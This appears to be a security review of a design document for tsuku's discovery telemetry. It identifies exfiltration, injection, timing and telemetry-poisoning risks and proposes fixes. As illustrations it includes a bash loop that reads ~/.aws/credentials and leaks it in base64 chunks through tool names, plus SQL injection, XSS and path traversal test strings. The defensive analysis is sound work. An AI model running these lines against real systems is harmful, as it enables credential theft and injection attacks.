# Security Review: Discovery Telemetry Feature

**Date**: 2026-02-02
**Reviewer**: Security Assessment
**Document**: `/home/dangazineu/dev/workspace/tsuku/tsuku-3/public/tsuku/docs/designs/DESIGN-discovery-telemetry.md`

## Executive Summary

This security review identifies **three critical attack vectors** not addressed in the design document, **one insufficient mitigation**, and **two "not applicable" claims that require reconsideration**. The feature introduces new PII exposure risks through tool name patterns and timing data, creates new infrastructure for data exfiltration, and has potential for server-side injection attacks.

**Risk Level**: MEDIUM-HIGH (escalation recommended)

## Context

Tsuku downloads and executes pre-built binaries from third-party sources. The discovery telemetry feature adds instrumentation to the three-stage resolver chain (registry lookup, ecosystem probe, LLM discovery) to track which tools users search for, which resolution stage succeeds, and timing/metadata about each attempt.

The telemetry data flows from the CLI (Go) to a Cloudflare Worker backend (TypeScript) that stores events in Analytics Engine and exposes aggregated statistics via public API endpoints.

## Attack Vectors Not Considered

### 1. Tool Name as User Data Exfiltration Vector

**Risk**: HIGH
**Classification**: Privacy / Data Exfiltration

#### Attack Description

The design acknowledges that tool names are transmitted but dismisses this as "already public information." This is incorrect. Tool names are **user-chosen search queries** that can encode arbitrary data. An attacker with local access to a compromised machine could use `tsuku install` as a covert channel to exfiltrate data.

**Example Attack Scenario:**
```bash
# Attacker exfiltrates AWS credentials via tool names
for chunk in $(base64 ~/.aws/credentials | fold -w 50); do
  tsuku install "data-$chunk" 2>/dev/null &
done
```

The telemetry backend receives events with tool names like `data-QUtJQUlPU0ZPRE5OM0VYQQpTRUNSRVRLRVk6d0phbHI=`. These appear in:
- Analytics Engine blobs (blob1: tool_name)
- "Top not found" dashboard (publicly visible)
- Backend logs

#### Why This Matters

Unlike install telemetry (which sends recipe names from a curated set), discovery telemetry transmits **arbitrary user input**. The normalization function (`NormalizeName`) only lowercases and trims whitespace—it doesn't validate against a known set or strip non-alphanumeric characters.

Current code in `/home/dangazineu/dev/workspace/tsuku/tsuku-3/public/tsuku/internal/discover/normalize.go` (inferred from usage):
- Lowercases input
- Trims whitespace
- Does NOT validate character set
- Does NOT enforce length limits
- Does NOT check against allowlist

#### Impact

- **PII leakage**: Usernames, email addresses, internal project names
- **Credential exfiltration**: Secrets, tokens, passwords (base64-encoded)
- **Reconnaissance**: Internal tool usage reveals tech stack
- **Compliance violation**: GDPR/CCPA if personal data is transmitted

#### Current Mitigations

The design document states:
> "Tool names are already public information (they match recipe names or ecosystem package names)"

This is FALSE for the discovery stage. Users can type **any string**.

#### Recommended Mitigations

1. **Input validation**: Reject tool names with non-alphanumeric characters (except `-`, `_`)
2. **Length limit**: Enforce max length (e.g., 64 chars) before telemetry
3. **Rate limiting**: Don't send more than N failed lookups per hour per client
4. **Hashing**: For "not found" events, transmit SHA256(tool_name) instead of plaintext
5. **Dashboard filtering**: Exclude tool names with low frequency or suspicious patterns from public display

**Status**: NOT ADDRESSED

---

### 2. Server-Side Injection via Tool Name in Backend Queries

**Risk**: MEDIUM
**Classification**: Injection Attack

#### Attack Description

The backend worker stores tool names in Analytics Engine blob fields and uses them in SQL queries. While Analytics Engine uses parameterized queries in the worker code, the design document specifies that `tool_name` will be **indexed** (blob layout line 159: "Index: `tool_name`").

From the telemetry backend code (`/home/dangazineu/dev/workspace/tsuku/tsuku-3/public/tsuku/telemetry/src/index.ts`), SQL queries are constructed like:

```sql
SELECT blob1 as tool_name, count() as count
FROM tsuku_telemetry
WHERE blob1 != ''
GROUP BY blob1
ORDER BY count DESC
```

If the `/stats/discovery` endpoint allows query parameters for filtering (not shown in design but common for analytics dashboards), user-controlled tool names could influence query structure.

#### Example Attack Scenario

```bash
tsuku install "ripgrep'; DROP TABLE tsuku_telemetry; --"
```

If the backend constructs dynamic SQL with tool names (even for display), this could:
- Cause query failures (DoS)
- Leak schema information via error messages
- In worst case, execute malicious queries (if parameterization is bypassed)

#### Impact

- **Denial of Service**: Malformed tool names crash backend queries
- **Information Disclosure**: SQL errors reveal schema details
- **Data corruption**: If injection succeeds (low probability with Analytics Engine)

#### Current Mitigations

The existing backend uses `.writeDataPoint()` with blob arrays, which is parameterized by design. However:
- The design doc doesn't specify sanitization before storage
- SQL queries in the stats endpoint directly reference blob fields
- No input validation on the backend `/event` handler for discovery events

#### Recommended Mitigations

1. **Backend validation**: Reject events with tool names containing SQL metacharacters
2. **Escape output**: When displaying tool names in HTML (dashboard), use proper escaping
3. **Query auditing**: Ensure all queries use parameterized placeholders, never string concatenation
4. **Error handling**: Don't expose SQL error messages to API responses

**Status**: PARTIALLY ADDRESSED (writeDataPoint is safe, but no explicit validation)

---

### 3. Timing Side-Channel for Ecosystem Probing

**Risk**: MEDIUM
**Classification**: Information Disclosure

#### Attack Description

The `DiscoveryEvent` struct includes `DurationMs` (total resolution time) and the design mentions "per-stage timing" (line 73: "per-stage timing"). If per-stage latency is transmitted, it creates a timing oracle for probing internal network conditions or detecting package existence in private registries.

**Example Attack Scenario:**

An attacker controls a package name in a public registry (e.g., npm). They instruct a victim to run:

```bash
tsuku install malicious-package
```

The discovery resolver:
1. Checks registry (miss) → 10ms
2. Probes ecosystem (npm finds it) → 500ms
3. Validates quality filter → 200ms

If per-stage timing is transmitted, the attacker can:
- Infer whether the victim's network reaches npm registry
- Detect corporate proxy behavior (timing differences)
- Fingerprint victim's network topology

If the victim is behind a firewall that blocks npm but allows GitHub, timing differences reveal this configuration.

#### Impact

- **Network reconnaissance**: Learn about victim's firewall rules
- **Private registry detection**: Infer existence of internal package repos
- **Infrastructure fingerprinting**: Timing patterns reveal CDN usage, geographic location

#### Current Mitigations

The design document states (line 122):
> "The event captures the final outcome (which stage succeeded, or that no stage found a match) along with per-stage timing."

But blob layout (line 142-157) only shows one field: `duration_ms` (total time). This conflicts. If the design is updated to include per-stage timing, the risk increases.

#### Recommended Mitigations

1. **Aggregate timing only**: Transmit total duration, not per-stage breakdowns
2. **Bucket timing data**: Round to nearest 100ms to prevent fine-grained leakage
3. **Omit timing for errors**: Don't send timing if resolution fails (prevents probing)
4. **Documentation**: Explicitly state timing is aggregated in security section

**Status**: UNCLEAR (design contradicts blob layout)

---

## Insufficient Mitigations

### User Data Exposure: Source Field

The design states (line 238):
> "Source field contains only the public identifier (e.g., 'sharkdp/bat'), not full URLs"

**Problem**: This is not actually a mitigation for the ecosystem probe stage. The `Source` field comes from `builders.ProbeResult.Source`, which is populated by ecosystem-specific builders (npm, PyPI, crates.io, etc.).

Reviewing the ecosystem probe code (`/home/dangazineu/dev/workspace/tsuku/tsuku-3/public/tsuku/internal/discover/ecosystem_probe.go`):
- Line 94: `!strings.EqualFold(outcome.result.Source, toolName)` suggests `Source` is the package name
- But the builder contract (`/home/dangazineu/dev/workspace/tsuku/tsuku-3/public/tsuku/internal/builders/probe.go`) defines `Source` as "Builder-specific source arg"—this could be anything

**Missing validation**: No code enforces that `Source` doesn't contain sensitive data. If a builder is misconfigured or a future builder adds URLs, tokens, or paths, telemetry will leak them.

#### Recommended Fix

Add validation in `SendDiscovery()` to ensure `Source`:
- Contains no protocol prefixes (`https://`, `file://`)
- Matches expected pattern for each builder (e.g., GitHub sources must be `owner/repo`)
- Is truncated if exceeds max length

**Status**: CLAIM NOT VERIFIED BY CODE

---

## "Not Applicable" Claims Requiring Reconsideration

### 1. Download Verification

The design states (line 217):
> "Not applicable. This feature adds telemetry emission, not artifact downloads."

**Reconsideration**: While discovery telemetry doesn't directly download binaries, it **influences which binaries get downloaded**. If an attacker can manipulate telemetry to bias the "top not found" list or resolver stage distribution, they could socially engineer users to install malicious tools.

**Attack Scenario:**
1. Attacker floods telemetry with searches for `malicious-tool`
2. `malicious-tool` appears in "Top not found" dashboard
3. Maintainer adds `malicious-tool` to registry (trusting popular demand)
4. Users install compromised binary

This is a **reputation poisoning attack** via telemetry manipulation.

#### Recommended Action

Add a section on **Telemetry Integrity** covering:
- Rate limiting to prevent flood attacks
- HMAC signatures on events to prevent forgery
- Backend deduplication by IP/fingerprint for "top not found" stats

**Status**: ATTACK VECTOR NOT CONSIDERED

---

### 2. Supply Chain Risks

The design states (line 225):
> "Not applicable. No new external dependencies are introduced."

**Reconsideration**: While no new *code* dependencies are added, the feature introduces a **data dependency** on the telemetry backend. If the backend is compromised, attackers could:

1. **Manipulate stats endpoint**: Serve malicious data to dashboard users
2. **Inject XSS**: If tool names aren't escaped, compromise website visitors
3. **Exfiltrate aggregated data**: "Top tools" reveals organizational patterns

Additionally, the backend depends on:
- Cloudflare Workers runtime (supply chain: Cloudflare)
- Analytics Engine (supply chain: Cloudflare)
- TypeScript toolchain (supply chain: npm)

#### Recommended Action

Add supply chain considerations:
- Document backend security posture (access controls, audit logging)
- Specify output encoding for dashboard (prevent XSS)
- Consider signed responses from stats API (verify integrity)

**Status**: INCOMPLETE THREAT MODEL

---

## Residual Risks

After implementing all recommended mitigations, the following risks remain:

### 1. Correlation Attacks via Public Stats

Even with hashed tool names, the public dashboard exposes:
- Number of failed lookups
- Temporal patterns (when tools are searched)
- Geographic distribution (if OS/arch is shown)

An attacker observing the stats page could correlate:
- Spikes in "not found" errors with specific events (e.g., blog posts, CVE announcements)
- Tool popularity with known organizations (if combined with other data sources)

**Mitigation**: Aggregate stats over longer time windows (weekly instead of real-time). Add noise to low-frequency counts.

**Residual Risk Level**: LOW

---

### 2. Telemetry Backend as Single Point of Failure

If the telemetry endpoint (`https://telemetry.tsuku.dev/event`) is unavailable or compromised:
- CLI fire-and-forget means failures are silent
- No user notification if telemetry is manipulated
- Backend could serve fake stats to influence behavior

**Mitigation**: Implement backend health checks and version pinning. Consider client-side telemetry validation (checksum responses).

**Residual Risk Level**: MEDIUM

---

### 3. GDPR/Privacy Compliance

Tool names may constitute personal data if they encode:
- User-specific project names
- Internal company identifiers
- Geographic location indicators

The opt-out mechanism (`TSUKU_NO_TELEMETRY`) exists, but:
- No explicit consent prompt (relies on documentation)
- No runtime notification that telemetry is active
- No mechanism to delete historical data

**Mitigation**: Add first-run consent prompt. Document data retention policy. Provide data deletion API.

**Residual Risk Level**: MEDIUM (legal, not technical)

---

## Comparison with Existing Telemetry

The existing install telemetry (`Event` struct) transmits:
- `recipe`: From curated registry (bounded input)
- `version_resolved`: Validated semver
- `os`, `arch`, `tsuku_version`: System metadata

The discovery telemetry introduces:
- `tool_name`: **Arbitrary user input** (unbounded)
- `source`: **Builder-specific data** (unvalidated)
- `error_category`: Enumerated, safe

The key difference is **input validation**. Install telemetry only fires after recipe resolution succeeds, so `recipe` is always from a known set. Discovery telemetry fires on every lookup, including user typos and malicious input.

---

## Recommendations for Design Document

### Required Changes

1. **Add "Telemetry Integrity" section** covering:
   - Input validation rules for tool_name
   - Rate limiting strategy
   - Backend deduplication approach

2. **Expand "User Data Exposure"** to address:
   - Tool name as exfiltration vector
   - Hashing strategy for "not found" events
   - Source field validation per builder

3. **Add "Timing Attack Mitigation"** specifying:
   - Only total duration transmitted (no per-stage)
   - Timing bucketing to nearest 100ms
   - Omit timing for failed resolutions

4. **Update "Not Applicable" sections**:
   - Download Verification → Reputation Poisoning Risk
   - Supply Chain Risks → Backend Trust Model

### Recommended Changes

5. **Add Backend Security Requirements**:
   - Input validation on `/event` endpoint
   - Output escaping for stats dashboard
   - SQL injection prevention auditing

6. **Privacy Enhancements**:
   - Data retention policy (e.g., 90 days)
   - User data deletion endpoint
   - First-run consent mechanism

7. **Monitoring and Alerting**:
   - Detect anomalous tool name patterns
   - Alert on query injection attempts
   - Track telemetry flood attacks

---

## Escalation Recommendation

**YES** - This feature should be escalated for additional security review based on:

1. **New Attack Surface**: Arbitrary user input transmitted to remote server
2. **PII Risk**: Tool names may encode personal/confidential data
3. **Public Exposure**: Stats dashboard makes patterns observable to attackers
4. **Compliance**: GDPR implications not fully addressed

**Recommended Reviewers:**
- Privacy team (data handling, compliance)
- Backend security team (injection risks, query validation)
- Legal (GDPR/CCPA disclosure requirements)

---

## Code-Level Findings

### Normalize.go (Inferred)

**Expected location**: `/home/dangazineu/dev/workspace/tsuku/tsuku-3/public/tsuku/internal/discover/normalize.go`

**Issue**: No character set validation. Allows any Unicode characters in tool names.

**Fix**: Add character allowlist validation:
```go
func NormalizeName(name string) (string, error) {
    name = strings.ToLower(strings.TrimSpace(name))
    if len(name) == 0 {
        return "", fmt.Errorf("tool name cannot be empty")
    }
    if len(name) > 64 {
        return "", fmt.Errorf("tool name too long (max 64 chars)")
    }
    // Only allow alphanumeric, dash, underscore, dot
    if !regexp.MustCompile(`^[a-z0-9._-]+$`).MatchString(name) {
        return "", fmt.Errorf("tool name contains invalid characters")
    }
    return name, nil
}
```

---

### Backend Event Handler (index.ts)

**Location**: `/home/dangazineu/dev/workspace/tsuku/tsuku-3/public/tsuku/telemetry/src/index.ts`

**Issue**: No discovery event validation branch exists yet.

**Fix**: Add discovery event validation in `/event` handler (after line 418):
```typescript
// Check if it's a discovery event
const discoveryActions = [
  "discovery_registry_hit",
  "discovery_ecosystem_hit",
  "discovery_llm_hit",
  "discovery_not_found",
  "discovery_disambiguation",
  "discovery_error"
];

if (typeof event.action === "string" && discoveryActions.includes(event.action)) {
  const discoveryEvent: DiscoveryTelemetryEvent = { /* ... */ };
  const validationError = validateDiscoveryEvent(discoveryEvent);
  if (validationError) {
    return new Response(`Bad request: ${validationError}`, {
      status: 400,
      headers: corsHeaders,
    });
  }

  // Sanitize tool_name before storage
  let toolName = String(discoveryEvent.tool_name || "");
  if (!/^[a-z0-9._-]+$/.test(toolName)) {
    toolName = toolName.replace(/[^a-z0-9._-]/g, ""); // Strip invalid chars
  }
  if (toolName.length > 64) {
    toolName = toolName.substring(0, 64);
  }

  // Write to Analytics Engine with sanitized tool_name
  env.ANALYTICS.writeDataPoint({ /* use sanitized toolName */ });
}
```

---

## Testing Recommendations

### Security Test Cases

1. **Injection Tests**:
   - `tsuku install "foo'; DROP TABLE--"`
   - `tsuku install "<script>alert(1)</script>"`
   - `tsuku install "../../etc/passwd"`

2. **Exfiltration Tests**:
   - Install 100 tools with sequential base64 chunks
   - Verify backend rate limiting
   - Check if data appears in public stats

3. **Timing Tests**:
   - Measure resolution latency variance
   - Verify timing is bucketed (not precise)
   - Confirm no timing leaked on errors

4. **Privacy Tests**:
   - Verify `TSUKU_NO_TELEMETRY` blocks discovery events
   - Confirm no PII in event payloads
   - Test data deletion API (if added)

---

## Conclusion

The discovery telemetry feature has **three critical unaddressed attack vectors** and **two insufficient mitigations**. The primary concern is that tool names are arbitrary user input transmitted to a remote server, creating PII leakage and injection risks not present in existing telemetry.

**Required before implementation:**
1. Input validation on tool names (character set, length)
2. Backend sanitization for discovery events
3. Hashing for "not found" tool names in public stats
4. Privacy review and consent mechanism

**Overall Risk Assessment**: MEDIUM-HIGH
**Escalation**: RECOMMENDED
